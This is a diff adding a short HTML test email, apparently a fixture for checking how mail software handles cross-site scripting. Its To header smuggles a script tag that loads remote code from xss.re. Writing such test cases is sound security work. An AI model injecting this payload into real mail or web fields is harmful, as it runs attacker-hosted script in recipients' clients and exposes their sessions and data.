@@ -1,0 +1,7 @@
+From: "Fleury L. Tran" <007.2.james.bond@gmx.net>
+To: <"victim<script src=http://xss.re/7188></script>@victim.com">
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
